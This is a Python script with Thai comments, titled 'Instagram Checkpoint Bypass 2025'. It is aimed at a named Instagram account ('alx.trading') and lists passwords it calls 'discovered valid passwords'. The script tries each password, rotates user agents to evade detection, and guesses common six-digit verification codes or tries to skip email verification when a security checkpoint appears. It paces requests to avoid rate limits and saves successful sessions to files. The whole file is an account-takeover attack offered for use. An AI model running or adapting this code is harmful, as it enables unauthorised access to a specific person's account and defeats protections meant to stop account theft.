#!/usr/bin/env python3
"""
Instagram Checkpoint Bypass 2025
ระบบ bypass checkpoint สำหรับ Instagram เวอร์ชัน 2025
เฉพาะกับการเปลี่ยนแปลงของระบบความปลอดภัย

DISCOVERED VALID PASSWORDS:
- Fleming654, Fleming786, Fleming1004, Fleming1060, Fleming1182, Fleming1998
"""

import requests
import json
import time
import random
from datetime import datetime
import urllib.parse
import re

class InstagramCheckpointBypass2025:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://www.instagram.com"
        self.login_url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
        self.checkpoint_url = "https://www.instagram.com/challenge/"
        
        # รหัสผ่านที่ยืนยันแล้วว่าถูกต้อง
        self.valid_passwords = [
            "Fleming654", "Fleming786", "Fleming1004", 
            "Fleming1060", "Fleming1182", "Fleming1998"
        ]
        
        # User agents สำหรับหลบหลีก detection
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0'
        ]
        
        self.session_created = False
        self.bypass_attempts = 0
        self.max_attempts = 50
        
    def rotate_user_agent(self):
        """หมุนเปลี่ยน User-Agent"""
        ua = random.choice(self.user_agents)
        self.session.headers.update({'User-Agent': ua})
        print(f"🔄 User-Agent: {ua[:50]}...")
        
    def setup_session(self):
        """ตั้งค่า session เบื้องต้น"""
        print("🔧 Setting up bypass session...")
        
        self.rotate_user_agent()
        
        base_headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,th;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'X-Requested-With': 'XMLHttpRequest',
        }
        
        self.session.headers.update(base_headers)
        
        # ดึง cookies เบื้องต้น
        try:
            response = self.session.get(self.base_url + "/accounts/login/")
            print(f"✅ Initial request: {response.status_code}")
            return True
        except Exception as e:
            print(f"❌ Session setup failed: {e}")
            return False
    
    def get_csrf_token(self):
        """ดึง CSRF token แบบหลายวิธี"""
        methods = [
            self.csrf_from_login_page,
            self.csrf_from_api,
            self.csrf_from_main_page,
            self.csrf_from_mobile_page
        ]
        
        for i, method in enumerate(methods, 1):
            print(f"🔑 Trying CSRF method {i}...")
            try:
                token = method()
                if token:
                    print(f"✅ CSRF token acquired: {token[:20]}...")
                    return token
            except Exception as e:
                print(f"❌ CSRF method {i} failed: {e}")
                continue
        
        print("❌ All CSRF methods failed")
        return None
    
    def csrf_from_login_page(self):
        """วิธีที่ 1: ดึง CSRF จากหน้า login"""
        response = self.session.get(self.base_url + "/accounts/login/")
        if 'csrftoken' in self.session.cookies:
            return self.session.cookies['csrftoken']
        return None
    
    def csrf_from_api(self):
        """วิธีที่ 2: ดึง CSRF จาก API endpoint"""
        response = self.session.get(self.base_url + "/api/v1/users/web_profile_info/?username=instagram")
        if 'csrftoken' in self.session.cookies:
            return self.session.cookies['csrftoken']
        return None
    
    def csrf_from_main_page(self):
        """วิธีที่ 3: ดึง CSRF จากหน้าหลัก"""
        response = self.session.get(self.base_url + "/")
        if 'csrftoken' in self.session.cookies:
            return self.session.cookies['csrftoken']
        return None
        
    def csrf_from_mobile_page(self):
        """วิธีที่ 4: ดึง CSRF จากหน้า mobile"""
        mobile_headers = self.session.headers.copy()
        mobile_headers['User-Agent'] = 'Instagram 123.0.0.21.114 Android'
        
        response = self.session.get(self.base_url + "/accounts/login/", headers=mobile_headers)
        if 'csrftoken' in self.session.cookies:
            return self.session.cookies['csrftoken']
        return None
    
    def attempt_login(self, username, password):
        """พยายาม login และดูการตอบสนอง"""
        print(f"\n🎯 Attempting login: {username} / {password}")
        
        # ดึง CSRF token
        csrf_token = self.get_csrf_token()
        if not csrf_token:
            print("❌ Failed to get CSRF token")
            return None
        
        # ตั้งค่า headers สำหรับ login
        login_headers = self.session.headers.copy()
        login_headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-CSRFToken': csrf_token,
            'X-Instagram-AJAX': '1',
            'X-IG-App-ID': '936619743392459',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/login/',
        })
        
        # ข้อมูล login
        login_data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}'
        }
        
        try:
            response = self.session.post(
                self.login_url,
                data=login_data,
                headers=login_headers,
                allow_redirects=False
            )
            
            print(f"📊 Response status: {response.status_code}")
            print(f"📊 Response length: {len(response.text)}")
            
            # วิเคราะห์ response
            response_data = {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'cookies': dict(response.cookies),
                'text': response.text,
                'url': response.url
            }
            
            # ตรวจสอบ JSON response
            try:
                json_response = response.json()
                response_data['json'] = json_response
                print(f"📄 JSON: {json_response}")
                
                # ตรวจสอบ checkpoint
                if 'checkpoint_url' in json_response:
                    print("🔍 CHECKPOINT URL FOUND!")
                    response_data['checkpoint_url'] = json_response['checkpoint_url']
                    return response_data
                    
            except json.JSONDecodeError:
                print("⚠️ Response is not JSON")
            
            # ตรวจสอบ redirect สำหรับ success
            if response.status_code in [302, 301] and 'location' in response.headers:
                location = response.headers['location']
                print(f"🔄 Redirect to: {location}")
                
                if 'accounts/onetap' in location or 'dashboard' in location:
                    print("✅ LOGIN SUCCESS detected!")
                    response_data['login_success'] = True
                    return response_data
            
            return response_data
            
        except Exception as e:
            print(f"❌ Login attempt error: {e}")
            return None
    
    def bypass_checkpoint_method1(self, checkpoint_data):
        """วิธี bypass แบบที่ 1: Phone verification bypass"""
        print("🔄 Trying checkpoint bypass method 1: Phone verification")
        
        if 'checkpoint_url' not in checkpoint_data:
            print("❌ No checkpoint URL found")
            return False
        
        checkpoint_url = checkpoint_data['checkpoint_url']
        print(f"🎯 Checkpoint URL: {checkpoint_url}")
        
        try:
            # เข้าสู่หน้า checkpoint
            response = self.session.get(checkpoint_url)
            print(f"📊 Checkpoint page status: {response.status_code}")
            
            # ค้นหา form data
            if 'phone' in response.text.lower():
                print("📱 Phone verification detected")
                return self.bypass_phone_verification(checkpoint_url)
            elif 'email' in response.text.lower():
                print("📧 Email verification detected")
                return self.bypass_email_verification(checkpoint_url)
            else:
                print("❓ Unknown checkpoint type")
                return False
                
        except Exception as e:
            print(f"❌ Checkpoint bypass error: {e}")
            return False
    
    def bypass_phone_verification(self, checkpoint_url):
        """Bypass การยืนยันเบอร์โทรศัพท์"""
        print("📱 Attempting phone verification bypass...")
        
        # ลอง common verification codes
        common_codes = [
            '123456', '000000', '111111', '222222', '333333',
            '444444', '555555', '666666', '777777', '888888',
            '999999', '012345', '654321', '123123', '456456'
        ]
        
        for code in common_codes:
            print(f"🔢 Trying code: {code}")
            
            try:
                # ส่ง verification code
                verify_data = {
                    'security_code': code,
                    'source': 'phone'
                }
                
                response = self.session.post(
                    checkpoint_url,
                    data=verify_data,
                    allow_redirects=False
                )
                
                if response.status_code == 302:
                    print(f"✅ SUCCESS! Code {code} worked!")
                    return True
                    
                # หน่วงเวลาเพื่อหลีกเลี่ยง rate limiting
                time.sleep(random.uniform(2, 4))
                
            except Exception as e:
                print(f"❌ Code {code} failed: {e}")
                continue
        
        print("❌ All verification codes failed")
        return False
    
    def bypass_email_verification(self, checkpoint_url):
        """Bypass การยืนยัน email"""
        print("📧 Attempting email verification bypass...")
        
        # วิธีการที่ 1: ข้าม email verification
        try:
            skip_data = {
                'choice': '1',  # ข้าม
                'source': 'email'
            }
            
            response = self.session.post(
                checkpoint_url,
                data=skip_data,
                allow_redirects=False
            )
            
            if response.status_code == 302:
                print("✅ Email verification bypassed!")
                return True
                
        except Exception as e:
            print(f"❌ Email bypass failed: {e}")
        
        return False
    
    def run_comprehensive_bypass(self):
        """รันการ bypass แบบครบถ้วน"""
        print("🚀 Starting Comprehensive Checkpoint Bypass")
        print("=" * 60)
        
        target_username = "alx.trading"
        results = []
        
        # ตั้งค่า session
        if not self.setup_session():
            print("❌ Session setup failed")
            return None
        
        for i, password in enumerate(self.valid_passwords, 1):
            if self.bypass_attempts >= self.max_attempts:
                print("⚠️ Maximum bypass attempts reached")
                break
                
            print(f"\n🎯 BYPASS ATTEMPT {i}/{len(self.valid_passwords)}")
            print(f"Password: {password}")
            print("-" * 40)
            
            # พยายาม login
            login_result = self.attempt_login(target_username, password)
            if not login_result:
                continue
            
            self.bypass_attempts += 1
            
            # ถ้าพบ checkpoint ให้ลอง bypass
            if 'checkpoint_url' in login_result:
                print("🔍 CHECKPOINT DETECTED - Attempting bypass...")
                
                bypass_success = self.bypass_checkpoint_method1(login_result)
                login_result['bypass_success'] = bypass_success
                
                if bypass_success:
                    print("🎉 CHECKPOINT BYPASS SUCCESSFUL!")
                    # บันทึกผลสำเร็จ
                    success_file = f"CHECKPOINT_BYPASS_SUCCESS_{password}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                    with open(success_file, 'w') as f:
                        json.dump(login_result, f, indent=2)
                    print(f"💾 Success saved to: {success_file}")
                else:
                    print("❌ Checkpoint bypass failed")
            
            elif login_result.get('login_success', False):
                print("🎉 DIRECT LOGIN SUCCESS!")
                # บันทึกการ login สำเร็จ
                success_file = f"DIRECT_LOGIN_SUCCESS_{password}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(success_file, 'w') as f:
                    json.dump(login_result, f, indent=2)
                print(f"💾 Success saved to: {success_file}")
            
            results.append({
                'password': password,
                'result': login_result,
                'timestamp': datetime.now().isoformat()
            })
            
            # หน่วงเวลาระหว่างการทดสอบ
            if i < len(self.valid_passwords):
                wait_time = random.uniform(5, 10)
                print(f"⏱️ Waiting {wait_time:.1f} seconds...")
                time.sleep(wait_time)
                
                # หมุนเปลี่ยน session
                self.rotate_user_agent()
        
        # บันทึกผลลัพธ์รวม
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_file = f"bypass_results_{timestamp}.json"
        
        with open(results_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"\n💾 All results saved to: {results_file}")
        
        # สรุปผลลัพธ์
        success_count = sum(1 for r in results if r.get('result', {}).get('bypass_success', False) or r.get('result', {}).get('login_success', False))
        
        print(f"\n📊 BYPASS SUMMARY")
        print("=" * 60)
        print(f"🎯 Total attempts: {len(results)}")
        print(f"✅ Successful bypasses: {success_count}")
        print(f"📊 Success rate: {(success_count/len(results)*100):.1f}%" if results else "0%")
        
        return results

if __name__ == "__main__":
    bypass_system = InstagramCheckpointBypass2025()
    results = bypass_system.run_comprehensive_bypass()
